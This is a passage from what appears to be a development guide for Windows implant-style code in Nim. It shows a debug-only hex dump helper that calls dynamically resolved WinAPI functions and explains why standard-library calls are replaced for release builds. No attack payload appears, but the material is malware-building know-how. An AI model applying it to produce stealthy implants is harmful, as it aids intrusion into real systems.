      discard pWriteConsoleA(pGetStdHandle(STD_OUTPUT_HANDLE), buf, length, NULL, NULL)
      discard pLocalFree(cast[HLOCAL](buf))

proc dumpHex*(data: pointer, size: int) {.inline.} =
  when defined(malDebug):
    var 
      p = cast[ptr byte](data)
      ascii: array[17, byte]
    for i in 0 ..< size:
      PRINTA("%02x ", p[])
      if p[] >= ' '.byte and p[] <= '~'.byte:
        ascii[i mod 16] = p[]
      else: ascii[i mod 16] = '.'.byte
      if ((i+1) mod 8) == 0 or (i + 1) == size:
        PRINTA(" ")
        if (i + 1) mod 16 == 0:
          PRINTA("|  %s \n", cast[cstring](ascii[0].addr))
        elif (i + 1) == size:
          ascii[(i+1) mod 16] = '\0'.byte
          if ((i+1) mod 16) <= 8:
            PRINTA(" ")
          for j in (i + 1) mod 16 ..< 16:
            PRINTA("   ")
          PRINTA("|  %s \n", cast[cstring](ascii[0].addr))
      p = cast[ptr byte](cast[uint](data) + i.uint + 1)
```

Two properties worth noting: everything inside the `when defined(malDebug)` is *absent* from a
release build (not just unreachable - the arguments are never even type-checked), so `PRINTA` costs
nothing but must still be used with call syntax the debug build accepts; and `PRINTA` does not check
`ninst.IsInitialized`, so it must not be called before a successful `init(ninst)`.

The wider rule: every `std`, `system` or winim convenience you touch has to be either reimplemented
like the two above or replaced with the corresponding WinAPI through the instance. That is what the
0x12 porting checklist in SKILL.md Section 13 is about.
